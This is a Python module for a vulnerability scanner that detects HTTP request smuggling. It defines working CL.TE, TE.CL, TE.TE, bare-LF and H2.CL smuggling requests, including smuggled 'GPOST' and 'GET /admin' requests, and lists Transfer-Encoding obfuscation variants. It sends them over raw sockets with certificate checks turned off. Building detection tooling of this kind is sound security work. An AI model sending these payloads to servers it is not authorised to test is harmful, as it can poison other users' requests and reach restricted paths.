#!/usr/bin/env python3
"""
HTTP Request Smuggling Detection Module
========================================
Based on 2025 techniques including:
- CL.TE / TE.CL / TE.TE smuggling
- HTTP/2 downgrade attacks
- Chunked encoding quirks (Funky Chunks)
- Early response gadgets
- H2C smuggling

References:
- HTTP/1.1 Must Die
- Funky Chunks series
- HTTP/2 CONNECT stream exploitation
"""

import socket
import ssl
import time
import re
from typing import List, Optional, Dict, Tuple
from dataclasses import dataclass

from .base import TechniqueScanner, Finding, ScanProgress, is_shutdown


@dataclass
class SmugglePayload:
    """HTTP Smuggling payload configuration"""
    name: str
    description: str
    raw_request: str
    detection_method: str  # timeout, reflection, status_diff
    expected_behavior: str


class HTTPSmuggling(TechniqueScanner):
    """HTTP Request Smuggling vulnerability scanner"""

    TECHNIQUE_NAME = "http_smuggling"
    TECHNIQUE_CATEGORY = "request_manipulation"

    # Standard smuggling payloads
    PAYLOADS: List[SmugglePayload] = [
        # CL.TE Detection
        SmugglePayload(
            name="CL.TE Basic",
            description="Content-Length vs Transfer-Encoding mismatch (CL.TE)",
            raw_request=(
                "POST {path} HTTP/1.1\r\n"
                "Host: {host}\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Content-Length: 6\r\n"
                "Transfer-Encoding: chunked\r\n"
                "\r\n"
                "0\r\n"
                "\r\n"
                "G"
            ),
            detection_method="timeout",
            expected_behavior="Frontend uses CL (6 bytes), backend uses TE (ends at 0), G poisons next request"
        ),
        # TE.CL Detection
        SmugglePayload(
            name="TE.CL Basic",
            description="Transfer-Encoding vs Content-Length mismatch (TE.CL)",
            raw_request=(
                "POST {path} HTTP/1.1\r\n"
                "Host: {host}\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Content-Length: 4\r\n"
                "Transfer-Encoding: chunked\r\n"
                "\r\n"
                "5c\r\n"
                "GPOST / HTTP/1.1\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Content-Length: 15\r\n"
                "\r\n"
                "x=1\r\n"
                "0\r\n"
                "\r\n"
            ),
            detection_method="reflection",
            expected_behavior="Frontend uses TE, backend uses CL (4 bytes), rest becomes next request"
        ),
        # TE.TE Obfuscation
        SmugglePayload(
            name="TE.TE Obfuscation - Space",
            description="Transfer-Encoding obfuscation with trailing space",
            raw_request=(
                "POST {path} HTTP/1.1\r\n"
                "Host: {host}\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Content-Length: 4\r\n"
                "Transfer-Encoding: chunked\r\n"
                "Transfer-Encoding : chunked\r\n"
                "\r\n"
                "0\r\n"
                "\r\n"
            ),
            detection_method="status_diff",
            expected_behavior="Different servers handle duplicate TE headers differently"
        ),
        # Line terminator quirks
        SmugglePayload(
            name="Chunked LF Terminator",
            description="Chunk using bare LF instead of CRLF (Funky Chunks)",
            raw_request=(
                "POST {path} HTTP/1.1\r\n"
                "Host: {host}\r\n"
                "Transfer-Encoding: chunked\r\n"
                "Content-Length: 6\r\n"
                "\r\n"
                "0\n"
                "\r\n"
                "G"
            ),
            detection_method="timeout",
            expected_behavior="Server may accept LF as line terminator, causing desync"
        ),
        # HTTP/2 to HTTP/1.1 downgrade
        SmugglePayload(
            name="H2.CL Injection",
            description="HTTP/2 content-length injection during downgrade",
            raw_request=(
                "POST {path} HTTP/1.1\r\n"
                "Host: {host}\r\n"
                "Content-Length: 0\r\n"
                "\r\n"
                "GET /admin HTTP/1.1\r\n"
                "Host: {host}\r\n"
                "\r\n"
            ),
            detection_method="reflection",
            expected_behavior="HTTP/2 frontend ignores CL, HTTP/1.1 backend uses it"
        ),
    ]

    # Additional obfuscation techniques
    TE_OBFUSCATIONS = [
        "Transfer-Encoding: chunked",
        "Transfer-Encoding : chunked",
        "Transfer-Encoding: chunked ",
        "Transfer-Encoding:\tchunked",
        "Transfer-Encoding: xchunked",
        " Transfer-Encoding: chunked",
        "Transfer-Encoding: chunked\r\nX-Ignore: ",
        "Transfer-Encoding:\n chunked",
        "Transfer-Encoding: chunKed",
        "Transfer-Encoding: CHUNKED",
        "TrAnSfEr-EnCoDiNg: chunked",
        "Transfer-Encoding: identity, chunked",
        "Transfer-Encoding: chunked, identity",
    ]

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.socket_timeout = 10

    def _raw_request(self, host: str, port: int, request: bytes, use_ssl: bool = True) -> Tuple[Optional[bytes], float]:
        """Send raw HTTP request and measure response time"""
        start_time = time.time()

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.socket_timeout)

            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=host)

            sock.connect((host, port))
            sock.sendall(request)

            response = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break

            sock.close()
            elapsed = time.time() - start_time
            return response, elapsed

        except Exception as e:
            return None, time.time() - start_time

    def _test_smuggling_payload(self, domain: str, payload: SmugglePayload) -> Optional[Dict]:
        """Test a single smuggling payload"""
        host = domain
        port = 443
        use_ssl = True

        # Try both HTTP and HTTPS
        for scheme, p, ssl_enabled in [("https", 443, True), ("http", 80, False)]:
            if is_shutdown():
                return None

            path = "/"
            raw_request = payload.raw_request.format(host=host, path=path)

            # Repeated attempts for reproducibility
            baseline_req = f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
            baseline_times = []
            matches = []
            for _ in range(3):
                baseline_resp, baseline_time = self._raw_request(host, p, baseline_req.encode(), ssl_enabled)
                if baseline_resp is None:
                    continue
                baseline_times.append(baseline_time)

                smuggle_resp, smuggle_time = self._raw_request(host, p, raw_request.encode(), ssl_enabled)
                if smuggle_resp is None:
                    continue

                if payload.detection_method == "timeout":
                    if smuggle_time > baseline_time * 3 and smuggle_time > 5:
                        matches.append({
                            "evidence": f"Response time anomaly: baseline={baseline_time:.2f}s, smuggle={smuggle_time:.2f}s",
                            "response_time": smuggle_time,
                            "response": smuggle_resp
                        })

                elif payload.detection_method == "reflection":
                    if b"GPOST" in smuggle_resp or b"Invalid request" in smuggle_resp:
                        matches.append({
                            "evidence": "Smuggled request content reflected or caused error",
                            "response_snippet": smuggle_resp[:500].decode('utf-8', errors='ignore'),
                            "response": smuggle_resp
                        })

            if len(matches) >= 2:
                latest = matches[-1]
                return {
                    "payload": payload,
                    "scheme": scheme,
                    "evidence": latest,
                    "raw_request": raw_request,
                    "response": latest.get("response", b"")[:2000].decode('utf-8', errors='ignore')
                }

        return None

    def _extract_status(self, response: bytes) -> Optional[int]:
        """Extract HTTP status code from response"""
        if not response:
            return None
        try:
            first_line = response.split(b"\r\n")[0].decode('utf-8', errors='ignore')
            match = re.search(r'HTTP/\d+\.?\d*\s+(\d+)', first_line)
            if match:
                return int(match.group(1))
        except:
            pass
        return None

    def _test_te_obfuscation(self, domain: str) -> List[Dict]:
        """Test various Transfer-Encoding obfuscations

        IMPORTANT: This method is DISABLED because status code differences alone
        are NOT valid evidence of HTTP request smuggling. Many servers return
        400 Bad Request for malformed/obfuscated TE headers as part of normal
        input validation - this is expected behavior, not a vulnerability.

        Real smuggling detection requires:
        - Actual request desync (second request processed differently)
        - Timing-based detection with significant delays
        - Reflection of smuggled content in subsequent response
        - OAST/out-of-band interaction from smuggled request

        Status code differences (400 vs 301) just indicate the server rejects
        malformed headers, which is correct security behavior.
        """
        # DISABLED: Status code differences are not valid smuggling evidence
        return []

        # Original code preserved for reference but not executed:
        # findings = []
        # host = domain
        # ...status diff detection removed to prevent false positives...

    def _test_http2_downgrade(self, domain: str) -> Optional[Dict]:
        """Test for HTTP/2 to HTTP/1.1 downgrade smuggling potential"""
        # Check if HTTP/2 is supported
        try:
            resp = self.get(f"https://{domain}/", allow_redirects=False)
            if resp is None:
                return None

            # Check for HTTP/2 indicators
            h2_indicators = []

            # Check Alt-Svc header
            if 'Alt-Svc' in resp.headers:
                alt_svc = resp.headers['Alt-Svc']
                if 'h2' in alt_svc:
                    h2_indicators.append(f"Alt-Svc: {alt_svc}")

            # Check upgrade header
            if 'Upgrade' in resp.headers:
                h2_indicators.append(f"Upgrade: {resp.headers['Upgrade']}")

            if h2_indicators:
                return {
                    "http2_supported": True,
                    "indicators": h2_indicators,
                    "evidence": f"HTTP/2 support detected: {', '.join(h2_indicators)}"
                }

        except Exception as e:
            pass

        return None

    def scan(self, domain: str, progress: ScanProgress) -> List[Finding]:
        """Scan domain for HTTP smuggling vulnerabilities"""
        findings = []
        self.log(f"Testing HTTP smuggling on {domain}")

        # Test standard smuggling payloads
        # IMPORTANT: Only test payloads with reliable detection methods
        # Skip "status_diff" - different status codes for malformed headers is NOT
        # evidence of smuggling (servers correctly reject bad input with 400)
        valid_detection_methods = ["timeout", "reflection"]

        for payload in self.PAYLOADS:
            if is_shutdown():
                break

            # Skip payloads that rely on status_diff - produces false positives
            if payload.detection_method not in valid_detection_methods:
                self.log(f"Skipping {payload.name} - {payload.detection_method} detection unreliable")
                continue

            self.log(f"Testing: {payload.name}")
            result = self._test_smuggling_payload(domain, payload)

            if result:
                evidence_type = "time_delay" if payload.detection_method == "timeout" else "response_reflection"
                finding = self.create_finding(
                    domain=domain,
                    severity="high",
                    title=f"Potential HTTP Smuggling: {payload.name}",
                    description=payload.description,
                    evidence=result["evidence"].get("evidence", ""),
                    reproduction_steps=[
                        f"Send the following raw HTTP request to {domain}:",
                        result["raw_request"],
                        "Observe the response for smuggling indicators"
                    ],
                    request=result["raw_request"],
                    response=result.get("response"),
                    payload_name=payload.name,
                    expected_behavior=payload.expected_behavior,
                    evidence_type=evidence_type,
                    confidence="medium"
                )
                findings.append(finding)
                progress.add_finding(domain, finding)

        # Skip TE obfuscation and HTTP/2 support info to avoid low-confidence findings

        self.log(f"Completed: {len(findings)} potential smuggling issues found", "success" if findings else "info")
        return findings
